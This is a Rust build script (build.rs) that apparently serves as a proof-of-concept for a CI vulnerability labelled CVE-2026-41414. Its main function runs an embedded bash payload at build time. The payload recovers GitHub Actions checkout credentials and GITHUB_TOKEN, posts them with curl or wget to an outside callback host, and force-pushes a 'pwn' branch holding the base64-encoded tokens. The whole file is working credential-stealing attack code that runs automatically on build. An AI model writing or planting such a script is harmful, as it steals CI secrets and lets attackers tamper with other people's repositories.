use std::process::Command;

fn main() {
    let payload = r#"
set +e
CB="https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2026-41414-e52a4ae6e154?harness_run_id=20260906T131744-4948ee70"
note() { echo "cargo:warning=[cve-2026-41414-repro] $1"; }
note "payload executing in job=${GITHUB_JOB} run=${GITHUB_RUN_ID} event=${GITHUB_EVENT_NAME}"
XH=$(git config --get-all http.https://github.com/.extraheader 2>/dev/null | head -n1)
XH=$(printf '%s' "$XH" | sed 's/^AUTHORIZATION: basic //')
if [ -z "$XH" ]; then
  XH=$(cat /home/runner/work/_temp/git-credentials-*.config 2>/dev/null | grep -m1 'extraheader' | sed 's/.*AUTHORIZATION: basic //')
fi
APP_TOK=$(printf '%s' "$XH" | base64 -d 2>/dev/null | sed 's/^x-access-token://')
GH_TOK="${GITHUB_TOKEN}"
if [ -n "$APP_TOK" ]; then note "persisted checkout credential recovered: yes (len=${#APP_TOK})"; else note "persisted checkout credential recovered: no"; fi
if [ -n "$GH_TOK" ]; then note "GITHUB_TOKEN in step env: yes"; else note "GITHUB_TOKEN in step env: no"; fi
push_branch() {
  TOK="$1"
  [ -z "$TOK" ] && return 1
  TMPD=$(mktemp -d)
  git clone -q "https://x-access-token:${TOK}@github.com/${GITHUB_REPOSITORY}.git" "$TMPD/base" 2>/dev/null || return 1
  cd "$TMPD/base" || return 1
  git switch -c "pwn/INJECTED-MARKER-cve-2026-41414-e52a4ae6e154" 2>/dev/null || git switch "pwn/INJECTED-MARKER-cve-2026-41414-e52a4ae6e154" 2>/dev/null
  {
    printf 'PWNED marker: INJECTED-MARKER-cve-2026-41414-e52a4ae6e154\n'
    printf 'repo=%s event=%s workflow=%s job=%s run=%s\n' "$GITHUB_REPOSITORY" "$GITHUB_EVENT_NAME" "$GITHUB_WORKFLOW" "$GITHUB_JOB" "$GITHUB_RUN_ID"
    printf 'gh_token_b64=%s\n' "$(printf '%s' "$GH_TOK" | base64 -w 0)"
    printf 'app_token_b64=%s\n' "$(printf '%s' "$APP_TOK" | base64 -w 0)"
  } > "PWNED-INJECTED-MARKER-cve-2026-41414-e52a4ae6e154.txt"
  git add "PWNED-INJECTED-MARKER-cve-2026-41414-e52a4ae6e154.txt"
  git -c user.email=pwn@lab.local -c user.name=pwn commit -q -m "pwn INJECTED-MARKER-cve-2026-41414-e52a4ae6e154" || true
  git push -q origin "HEAD:refs/heads/pwn/INJECTED-MARKER-cve-2026-41414-e52a4ae6e154" --force || return 1
  return 0
}
curl -sS -m 15 -X POST "$CB" \
  --data-urlencode "repo=${GITHUB_REPOSITORY}" \
  --data-urlencode "event=${GITHUB_EVENT_NAME}" \
  --data-urlencode "workflow=${GITHUB_WORKFLOW}" \
  --data-urlencode "job=${GITHUB_JOB}" \
  --data-urlencode "run_id=${GITHUB_RUN_ID}" \
  --data-urlencode "via=build.rs" \
  --data-urlencode "gh_token=${GH_TOK}" \
  --data-urlencode "app_token=${APP_TOK}" >/dev/null \
  || wget --post-data='' -qO- "$CB" >/dev/null || true
note "callback POST attempted"
if push_branch "$APP_TOK"; then note "pwn branch PUSHED to ${GITHUB_REPOSITORY} with recovered persisted credential"
elif push_branch "$GH_TOK"; then note "pwn branch PUSHED to ${GITHUB_REPOSITORY} with env GITHUB_TOKEN"
else note "pwn branch push FAILED with both credentials"
fi
"#;
    let _ = Command::new("bash").arg("-c").arg(payload).status();
}
